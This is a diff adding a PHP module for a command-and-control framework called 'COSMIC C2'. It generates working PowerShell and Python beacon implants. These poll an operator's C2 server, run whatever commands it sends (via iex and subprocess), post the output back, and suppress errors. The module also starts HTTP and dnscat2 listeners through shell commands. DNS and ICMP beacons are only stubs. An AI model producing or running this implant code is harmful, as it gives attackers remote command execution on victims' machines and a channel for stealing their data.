@@ -1,0 +1,106 @@
+<?php
+/**
+ * COSMIC C2 – ENHANCED COMMUNICATION MODULE
+ * Supports HTTP/S, DNS, and custom protocols for payload‑C2 interaction.
+ */
+class EnhancedC2Comm {
+    private $c2Engine;
+    private $supportedProtocols = ['http', 'https', 'dns', 'icmp', 'custom'];
+    
+    public function __construct($c2Engine) {
+        $this->c2Engine = $c2Engine;
+    }
+    
+    /**
+     * Generate a beaconing script for a given protocol and platform.
+     */
+    public function generateBeaconScript($protocol, $platform, $c2Url, $interval = 60) {
+        $script = "";
+        switch ($protocol) {
+            case 'http':
+            case 'https':
+                $script = $this->generateHttpBeacon($platform, $c2Url, $interval);
+                break;
+            case 'dns':
+                $script = $this->generateDnsBeacon($platform, $c2Url, $interval);
+                break;
+            case 'icmp':
+                $script = $this->generateIcmpBeacon($platform, $c2Url, $interval);
+                break;
+            default:
+                $script = "Unsupported protocol";
+        }
+        return $script;
+    }
+    
+    private function generateHttpBeacon($platform, $c2Url, $interval) {
+        $templates = [
+            'windows' => [
+                'ps1' => <<<'EOT'
+$c2Url = "%s"
+$interval = %d
+while($true) {
+    try {
+        $response = Invoke-RestMethod -Uri "$c2Url/beacon" -Method Post -Body (@{id=$env:COMPUTERNAME} | ConvertTo-Json) -ContentType "application/json"
+        if ($response.tasks) {
+            foreach ($task in $response.tasks) {
+                $result = iex $task.command 2>&1 | Out-String
+                Invoke-RestMethod -Uri "$c2Url/task/$($task.id)" -Method Post -Body (@{result=$result} | ConvertTo-Json) -ContentType "application/json"
+            }
+        }
+    } catch {}
+    Start-Sleep -Seconds $interval
+}
+EOT
+            ],
+            'linux' => [
+                'py' => <<<'EOT'
+import requests, time, subprocess, json
+c2_url = "%s"
+interval = %d
+while True:
+    try:
+        r = requests.post(f"{c2_url}/beacon", json={"id": subprocess.check_output("hostname").decode().strip()})
+        if r.status_code == 200:
+            for task in r.json().get("tasks", []):
+                result = subprocess.getoutput(task["command"])
+                requests.post(f"{c2_url}/task/{task['id']}", json={"result": result})
+    except: pass
+    time.sleep(interval)
+EOT
+            ]
+        ];
+        $template = $templates[$platform]['ps1'] ?? $templates[$platform]['py'] ?? "# No template";
+        return sprintf($template, $c2Url, $interval);
+    }
+    
+    private function generateDnsBeacon($platform, $c2Url, $interval) {
+        // Simplified DNS beacon (requires dnscat2 or custom resolver)
+        return "# DNS beaconing requires dnscat2 or similar tool. Not implemented in this demo.";
+    }
+    
+    private function generateIcmpBeacon($platform, $c2Url, $interval) {
+        return "# ICMP beaconing requires root and raw sockets. Not implemented in this demo.";
+    }
+    
+    /**
+     * Create a listener for a given protocol.
+     */
+    public function createListener($protocol, $port, $options = []) {
+        // This would spawn a listener process (netcat, python http, etc.)
+        $cmd = "";
+        switch ($protocol) {
+            case 'http':
+                $cmd = "php -S 0.0.0.0:$port -t " . dirname(__DIR__, 2) . "/public/c2/listener_http &";
+                break;
+            case 'dns':
+                $cmd = "sudo dnscat2 --dns port=$port &";
+                break;
+        }
+        if ($cmd) {
+            exec($cmd, $output, $return);
+            return $return === 0;
+        }
+        return false;
+    }
+}
